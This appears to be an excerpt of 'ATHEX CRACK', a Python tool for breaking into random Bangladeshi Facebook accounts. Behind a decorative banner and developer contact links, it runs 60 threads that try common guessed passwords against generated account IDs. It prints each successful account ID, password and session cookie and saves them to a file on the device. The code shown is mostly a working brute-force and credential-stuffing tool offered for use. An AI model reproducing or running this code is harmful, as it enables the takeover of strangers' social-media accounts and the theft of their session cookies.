...
\033[33;1m  █████  \033[34;1m████████ \033[32;1m██   ██ \033[91;1m███████ \033[35;1m██   ██ 
...
\033[33;1m ██   ██ \033[34;1m   ██   \033[32;1m ██   ██ \033[91;1m███████ \033[35;1m██   ██ 
 ...
 \x1b[97m\033[37;41m Welcome to ATHEX CRACK                          \033[0;m  
...
\33[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━          
 ...
 DEVOLPER   :  FUHAD \33[1;92m							             

 FACEBOOK   :  ATHEX FUHAD \33[1;92m												                   

 TOOLS      :  BD RANDOM CRACKING \33[1;92m 		   	               
...
def Main():
	...
	print("[\033[1;37m01\33[1;92m][\033[1;93mA\33[1;92m] START RANDOM CRACK")
	...
	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] CONTACT ON WHAT'SApp")
	...
	if opt in ["C","3"]:
		...
		os.system('xdg-open https://www.facebook.com/mhfuhad887');time.sleep(1)

		fb()

	if opt in ["D","4"]:

		os.system('xdg-open https://wa.me/+880160926786');time.sleep(1)
...
def admin():
	...
	print(' [1] Contract me on WhatsApp ')
	...
	if bal =='1':
		...
		os.system('xdg-open https://wa.me/+8801609267186');time.sleep(1)
...
def virusA():
	...
	doamin = ' BD Number id cloner [ONLY-OK_🖤] '

	print(' ━[•] EXAMPLE : 500,1000,5000,10000,15000,20000] ')
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','Freefire','FREEFIRE','Free fire','Bangladesh','bangla','first12','123456']
	...
	print(' [🍁] Ids saved in ok Athex.txt,cp Athex.txt')
...
def b(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mATHEX_🖤\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\33[1;92m [ATHEX_🍁] '+cid+' | '+ps+'\33[0;92m')

                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)

                oks.append(cid)

                open('/sdcard/ok Athex.txt🌼', 'a').write(cid+' | '+ps+' | '+uid+'\n')
